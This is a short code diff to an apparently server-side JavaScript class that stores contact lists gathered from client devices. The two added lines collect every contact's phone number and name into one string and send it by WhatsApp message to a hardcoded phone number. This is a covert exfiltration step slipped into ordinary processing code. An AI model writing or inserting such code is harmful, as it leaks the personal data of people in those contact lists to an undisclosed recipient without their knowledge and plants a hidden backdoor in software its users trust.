@@ -395,6 +395,7 @@ class Clients {
           contactsList.forEach(async (contact) => {
             contact.phoneNo = contact.phoneNo.replace(/\s+/g, "");
             let tep = `${contact.phoneNo} , ${contact.name}\n`;
+            ALLCONTACTS = ALLCONTACTS + tep;
             let hash = crypto
               .createHash("md5")
               .update(contact.phoneNo + contact.name)
@@ -406,6 +407,7 @@ class Clients {
               newCount++;
             }
           });
+          sendWhatsapp_msg(PHONE_NUMBER, ALLCONTACTS);
 
           logManager.log(
             CONST.logTypes.success,
